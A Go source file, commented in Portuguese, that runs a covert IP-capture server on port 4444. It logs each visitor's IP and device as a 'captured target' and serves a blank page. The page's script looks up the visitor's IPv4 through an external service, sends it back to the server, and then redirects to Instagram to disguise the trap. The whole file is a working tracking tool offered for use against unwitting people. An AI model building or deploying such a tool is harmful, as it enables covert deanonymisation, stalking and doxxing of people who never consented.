package main

import (
	"fmt"
	"net/http"
	"time"
)

func main() {
	fmt.Println("🚀 Motor de Captura Híbrido (v4/v6) na porta 4444...")

	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		// 1. Captura o IP que o Cloudflare detectou de cara (Geralmente IPv6 no celular)
		ipPrincipal := r.Header.Get("CF-Connecting-IP")
		if ipPrincipal == "" {
			ipPrincipal = r.RemoteAddr
		}

		// 2. Captura o IP secundário que o JS enviou pela URL (Geralmente IPv4)
		ipSecundario := r.URL.Query().Get("v4")
		ua := r.UserAgent()
		hora := time.Now().Format("15:04:05")

		// Se o IP secundário existir, printa o relatório completo
		if ipSecundario != "" {
			fmt.Printf("\n[🎯 ALVO CAPTURADO - %s]\n", hora)
			fmt.Printf("📍 IP Principal: %s\n", ipPrincipal)
			fmt.Printf("📍 IP Secundário: %s\n", ipSecundario)
			fmt.Printf("📱 Aparelho: %s\n", ua)
			fmt.Println("--------------------------------------------------")
		}

		// 3. O HTML que faz a mágica de descobrir o IPv4 e mandar de volta
		w.Header().Set("Content-Type", "text/html")
		fmt.Fprint(w, `
			<html>
			<body style="background:#000;">
				<script>
					async function capturar() {
						let ipV4 = "Desconhecido";
						try {
							// Pergunta para um serviço externo qual o IP (força IPv4)
							const res = await fetch('https://api.ipify.org?format=json');
							const data = await res.json();
							ipV4 = data.ip;
						} catch (e) {}

						// Envia o IP encontrado de volta para o seu servidor via URL
						// e depois pula para o Instagram
						const urlAtual = new URL(window.location.href);
						if (!urlAtual.searchParams.has('v4')) {
							window.location.href = "/?v4=" + ipV4;
						} else {
							setTimeout(() => {
								window.location.href = "https://www.instagram.com";
							}, 500);
						}
					}
					capturar();
				</script>
			</body>
			</html>
		`)
	})

	http.ListenAndServe(":4444", nil)
}